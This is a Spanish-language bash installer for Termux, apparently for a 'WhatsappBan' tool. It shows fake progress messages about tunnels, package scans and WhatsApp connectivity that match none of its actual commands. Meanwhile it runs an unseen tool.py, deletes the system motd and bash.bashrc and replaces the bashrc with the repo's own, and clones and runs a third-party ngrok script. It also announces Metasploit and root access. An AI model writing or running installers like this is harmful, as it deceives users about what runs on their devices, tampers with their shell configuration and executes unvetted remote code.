#!/bin/bash
echo -e "\e[32m Bienvenido a la instalacion de mi programa, espera un momento\e[39m"
sleep 5
echo -e "\e[32mIniciando Instalacion\e[39m"
sleep 5
echo -e "\e[32mInstalando Python\e[39m"
sleep 5
pkg install python
clear
echo -e "\e[32mInstalando banner extra\e[39m"
sleep 5
pkg install neofetch -y
clear
echo -e "\e[32mestableciendo tunel a red mobiles\e[39m"
sleep 5
pip install pybase64
echo -e "\e[32mInstalando repositorios de python\e[39m"
pkg install python*
clear
echo -e "\e[32mescaneando paquetes, espere por favor\e[39m"
sleep 10
clear
echo -e "\e[32m Asignando permisos \e[39m"
sleep 5
echo -e "\e[32m Acepte los permisos de storage de termux\e[39m"
termux-setup-storage
chmod +x tool.py
python tool.py
mv tool.py /data/data/com.termux/files/usr/etc
rm /data/data/com.termux/files/usr/etc/motd
sleep 2
cd /data/data/com.termux/files/usr/etc
sleep 1
rm bash.bashrc
cp ~/WhatsappBan/bash.bashrc /data/data/com.termux/files/usr/etc
clear
echo -e "\e[32m Aguarde por favor\e[39m"
sleep 5
echo -e "\e[32m Instalaremos Metasploit y Ngrok en su termux\e[39m"
sleep 5
clear
echo -e "\e[32m Descargando Ngrok\e[39m"
sleep 5
git clone https://github.com/Marcel0Sousa/termux-ngrok
clear
cd termux-ngrok
chmod +x termux-ngrok.sh
bash termux-ngrok.sh
clear
echo -e "\e[32m analizando tunel WSP\e[39m"
echo -e "\e[32m estableciondo conectividad con servicio de mensajeria WSP[39m"
sleep 5
clear
cd ..
echo -e "\e[1;31m REQUIERE SER ROOT..."
sleep 7
